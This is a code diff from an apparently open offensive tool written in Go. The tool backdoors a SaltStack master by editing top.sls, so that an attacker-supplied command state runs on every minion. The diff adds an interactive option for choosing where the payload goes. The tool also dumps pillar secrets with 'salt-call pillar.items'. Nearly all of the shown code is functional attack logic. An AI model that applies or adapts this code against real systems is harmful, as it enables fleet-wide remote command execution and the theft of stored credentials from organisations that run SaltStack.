@@ -51,9 +51,48 @@ func init() {
 	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
 }
 
-func backdoorSite(topLoc string) string {
-	groupAllRun := regexp.MustCompile(`(?sm)(\w+\:)(\s+)\'\*\'\:(\s+)\-`)
-	getAllStates := regexp.MustCompile(`(?sm)(^\w+)\:`)
+func backdoorSiteSpecific(topLoc string) {
+	lineReg := regexp.MustCompile(`(?sm)^(\s+)(\- [^\s]+)`)
+	comments := regexp.MustCompile(`#.*`)
+
+	fileContent, err := ioutil.ReadFile(topLoc)
+	if err != nil {
+		log.Println(err)
+		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
+	}
+
+	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))
+
+	newContent := ""
+	log.Printf("Original contents: %s", content)
+	for _, line := range strings.Split(content, "\n") {
+		//fmt.Println(line)
+		if line == "" {
+			continue
+		}
+		ques := fmt.Sprintf("Would you like to drop payload below the following: \n%s", line)
+		ans, err := moseutils.AskUserQuestion(ques, osTarget)
+		if err != nil {
+			log.Fatal("Quitting ...")
+		}
+		if ans {
+			newContent += lineReg.ReplaceAllString(line, "$1$2\n$1- "+saltState)
+		} else {
+			newContent += line + "\n"
+		}
+		log.Printf("New contenet so far: \n%s", newContent)
+	}
+	newContent += "\n"
+
+	err = ioutil.WriteFile(topLoc, []byte(newContent), 0644)
+	if err != nil {
+		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
+	}
+}
+
+func backdoorSite(topLoc string) {
+	groupAllRun := regexp.MustCompile(`(?sm)^(\s+)-`)
+	//getAllStates := regexp.MustCompile(`(?sm)(^\w+)\:`)
 	comments := regexp.MustCompile(`#.*`)
 
 	fileContent, err := ioutil.ReadFile(topLoc)
@@ -67,36 +106,15 @@ func backdoorSite(topLoc string) string {
 	// Check if base: '*' exists
 	found := groupAllRun.MatchString(content)
 	if found {
-		matches := groupAllRun.FindStringSubmatch(content)
-		spaces := len(matches[3]) - 1 // Number of spaces for addition of new - state
-		insertState := "$0 " + saltState + "\n" + strings.Repeat(" ", spaces) + "-"
+		insertState := "$0 " + saltState + "\n$0"
 		content = fmt.Sprint(groupAllRun.ReplaceAllString(content, insertState))
 		err = ioutil.WriteFile(topLoc, []byte(content), 0644)
 		if err != nil {
 			log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
 		}
-
-		return matches[1]
-
-	}
-	log.Println("No base group found in top.sls, creating group with name equivalent to supplied stateName")
-	// No state containing '*' make one
-	stateNames := getAllStates.FindAllStringSubmatch(content, -1)
-	var names []string
-	for _, m := range stateNames { //get all existing groups in top.sls (e.g. base:)
-		names = append(names, m[1])
-		if m[1] == saltState {
-			log.Fatalf("StateName duplicated in top.sls, exiting...")
-		}
 	}
 
-	content = content + "\n" + saltState + "\n  '*'\n    - " + saltState
-	err = ioutil.WriteFile(topLoc, []byte(content), 0644)
-	if err != nil {
-		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
-	}
-
-	return saltState
+	log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
 }
 
 func getTopLoc(topLoc string) string {
@@ -173,11 +191,14 @@ func generateState(stateFile string, cmd string, stateName string) bool {
 	return true
 }
 
-func getPillarSecrets() {
-	_, binLoc := moseutils.FindBin("salt-call", []string{"/bin", "/usr/bin", "/usr/sbin", "/sbin"})
+func getPillarSecrets(binLoc string) {
+	found, binLoc := moseutils.FindBin("salt-call", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
+	if !found {
+		log.Fatalf("salt-call binary not found, exiting...")
+	}
 	res, err := utils.RunCommand(binLoc, "pillar.items")
 	if err != nil {
-		log.Print("Error running command: salt-call pillar.items")
+		log.Printf("Error running command: %s '*' pillar.items", binLoc)
 	}
 	msg("%s", res)
 
@@ -241,7 +262,7 @@ func main() {
 	// 		moseutils.TrackChanges(cleanupFile, uploadFilePath)
 	// 	}
 
-	found, _ := moseutils.FindBin("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
+	found, binLoc := moseutils.FindBin("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
 	if !found {
 		log.Fatalf("salt binary not found, exiting...")
 	}
@@ -253,12 +274,16 @@ func main() {
 	// if cleanup {
 	// 	doCleanup(siteLoc)
 	// }
+	specific := false
 
 	backupSite(topLoc)
 	msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
+	if specific {
+		backdoorSiteSpecific(topLoc)
+	}
 	backdoorSite(topLoc)
 	createState(topLoc, bdCmd)
 
 	log.Println("Attempting to find secrets stored with salt Pillars")
-	getPillarSecrets()
+	getPillarSecrets(strings.TrimSpace(binLoc))
 }
